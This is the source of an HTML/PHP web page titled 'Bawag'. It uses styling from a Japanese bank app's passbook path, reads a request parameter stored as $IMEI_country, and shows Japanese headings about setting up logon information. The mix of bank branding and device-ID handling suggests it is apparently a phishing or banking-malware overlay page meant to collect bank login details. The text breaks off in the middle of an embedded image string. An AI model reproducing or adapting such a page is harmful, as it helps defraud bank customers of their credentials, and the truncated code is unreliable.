<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="jp/jp.co.sevenbank.AppPassbook/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
	<b>設定でお困りの方</b>
	<img style="width: 28px;padding: 3px 0px;float: right;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFwAAABcCAMAAADUMSJqAAAC/VBMVEX////v7u7d29vPzczCv763s7Oxraytqai0sLC9urnLyMfX1dTn5ub8+/v6+vrX1dappaSEfn1uZmRYT01KQD5GPDpMQkBNQ0FLQT9IPjtRSEZlXFt7dHKZlJPDwMDc29qopKNvaGZSSUdsZGOBenmVkI68uLiblpWIgoB1bWxbU1FNREJgWFaOiIfJx8b19fXW1dRZUE5aUVC3srLu7e3g3t7Gw8NoYF5OREJzbGu2srH29vbj4uGQjIpUTEpwaWeqpqT+/v6Jg4HBvbz9/Py1sbDx8fHZ2NeQiolUSkiHgYDi4eDq6emKg4L19PTRz85iWli+u7va2Nj29vWqpaSjnp39/fzJxsVeVlTOzMtmXlzk4+KLhYXOy8pSSEa/vLvr6upjW1lPRkS4trbt7Oykn553cG709PPh4N/W09PQzs3S0M/t7OtPRUOcl5aMhoX9/f2SjYxUS0lTSkhWTUv08/NQR0VrY2HRzs5RR0VqYmCIgYDz8vNXTkydmZf39/d5cnCzsK6CfHqsqKefm5qloaDT0dD+//7Y1taPiYi2tLT+/f35+fmrp6Zyamnw7+/IxcXd29rc2tqHgH/W1NPe3NxdVFKuqah9dnXBvr6Ig4K9u7zIx8e7t7fo6OeXkpHU0tK+vL3b3N3d3d/h4eKGf37Bv8De3+DX19nX19jX2Nnd3d6CfXx0bWvn5uVgVlTf4OHc3N26uLeUjo3d3t/Y2NmFf3708/Tb29zc3d6sp6bZ2tve3t+5t7exrKzQz9DZ2drMy8vS0tPY2NrOzs+EfXzx8PDT09S4tbSinZuvq6q5tbSrqKiAeXf4+Pf8/PzFw8Lr6unNysmkoJ/KycnY2drm5OS6ubna29zy8vHMycng4OHp6OiKhIJ6dXTW1tfc3N7Avr/+/v/9/v7b2tn8+/zGxcbOzc35+PiysbD8/Pu8u7ra2tuopqXR0dKppqaurKvU1NWvrayvq6zp5+fCwL99dXTNzM3Ny8zk5ObPz9D//v7s6+t/eHb+/f4D5Z1+AAAGU0lEQVRo3mNgGAWjYBSMglEwCqgBGJmYWVjZ2Dk4ubh5eKlpMB+/gKCQsIioiJi4hKSklLSMrBwjlYyWV1BUkpRSVlFV4FBTY2VX19DUktTW0dXTp9xoA11DSSNBYwMThJC+qZm6uYWEpZU1ZUbb2NpJ2jvwOGJIWJs52YkoOrtQYLarjqSQmhsOSXcPTwkvb3KN9vEVMRTww6PAX0YyIJDM0FYWlQnCryQ4xM4iNIwMs8MjxNUJx1hklKQH6ckm3FCKjRh10ZqiMaSaHmsYF0+cygQZUQ/SsqxpYlIysWpTNCVTSTHbL01EAVM0PSMzKzJbPgdd3Dsq15kEw/Mk8/nQhArCC9OkjYqKS3QUNVhLUeWY7XSiiQ/wsvIUNKEKmaKkyqISILBTylWqUkPNsw6S1XxEml2Tpm2GJsRhKFUrbJeUpFRcllskLFxUVleALF3fIMZCpOFWkvloIo3FnsLClRFNec3sLV5RSSXCJbmtKAraihWDiTLbWrmICVWEW8tOuMRTN6gdUpilGgK5Rh0oSjpFuogyvDvSClWgpylXWFipFyGgVlIrnFSIoiaoyNKPrEKG2a5EuKwTOQo7pYTj+vqR1bhoiEwgy3DZXOEinQxkEb2k2iKdiSiKJmjnE2PWpLrJqDk/X8JTxLYdWaRDq6TEaApqTJlHEK5Xp+YX2U1Lmo4SnjOkG0xRFHUYlthFoBXH6uIzCZkdb1g8a/actJJJKLW/dzqqqrlJwkrl81DFzCTnEzB7QVHVwkWLlyy0y+/Go8rNvkg4dzJaxZqh1dCD12zHpYbLlq9YuWr1GiNTPGZ7SQnXFoWjieqvTVyHv+RfL7hhJRBs3JSrgFNRhkxZbW3SZgxxjbIpBEqs1i0gw7fyCwnhqgDipYHu1t62HUNCXVQPr+GbcpN3gAxfsTOvsgOrCpPNxUrCdnG2WGq2XklOvIbvUjLbDTJ85Z69RQ5YE6plUq1wpdY+bN7iEHHFa3hdyf4DYMN3HEz0xdYAK88Vrk1KW4C9MJXYh9fwzVqHDkMMPxJwFFO6Z0aZYW1l4TEcJbUE/uaCrs7xrWDDl6uLY/HjCSlhYamTuDSfEjmN13APqOFbzlSePYche/5okrDU0fO4NIeKXsBr+HwjcLCs3lsrNA9T9qKQUm3xJZyaOyX88Rp+uegKMLVcPaQcgS2DZkgXFZtfw6WXdwa+XA0Ep3Ov3wA6XEH7BDZZJh07pT6c5apPlP1NvIbfSmrduXLl7abEO1gLeh27uLXHcOltE3fCXyhmRNwFli237wlhbfDb6CSJpVnjTiyn8Bteb6l4//DK5TERWDsM509oNnDhLFBnFMkTKM/nG87cufLBGQscbb/zBbg9XbK2gFCrPPfylpUHjkQ0kVyLt0qyE1ISLJ22auvWjbZJWIvmTLYTuFIiY5VWBkEH1MU93LFy4zLhbY8w5dhKxMWiOnA1AW0dCRreYRezZ+WqLbbamA1Ln2nFwsIWTY+x1nxVJU8IB93TJq1nG1ceeB6FmdSZa2uFhe2kX2DTliqpSkzERObaAmu6PS+TZqA3WzMMS4CFYtorbJFRq7OOGMMdBe1er165dUeemAY4Mzr2wIpHR9Vcbe0SbC0f/TQJK+LSVIaR0KE3Kw+8URUXsrpkpnBUeto2aO7o4XDywFYonlcVvVtAZIp1FcvfeHXlgd1vo3KTLOKkVY6WRMTi1cAuJpRAdH7wEEtdvXXl1p3vkt9/uPBx6yJOHSN8prPm6gQRn9lq0so+LQfWGVd3PNj4ZuvWVXseRuhMxe3RSiMuUrLyuqoSjj2QyhRSo+4tUezHrvRFqLaWHmkFham53eflBxCmb3kv7oFV4RcvySh/Uosh0/Kklt074IZv3Ziv/RVLsnWOEv1GxnDOFxmJo9/3wB2/40diQz26minVYsUn08npCOnLWkifObATFvI/86ehlnpP/T3sJGWYyR2FkjMXb+jauuUNKN1smFMV5YNU01+b/i1JQmgTBcNz/ScjchvYfy3fsvwNu04RJ8PvUjd9tz8ZC+JbNIUllf7OPUfhyF+oTm7UrNCWBouqW8Bkl19lqVg1LVcyVzjNgbuAgWLQ3ygTUVwkXQdqrqTfla5S7puRf1nuzisqjbY6ZlRkQ4K7oDTnD2PpP4ZRMApGwSgY3gAAsp0JWM+5XwIAAAAASUVORK5CYII=">
</div>

<div class="header2">
	<b>ログオン情報の設定</b>
</div>

<div class="logo">
	<img style="width: 40%;" src="data:image/png;base64,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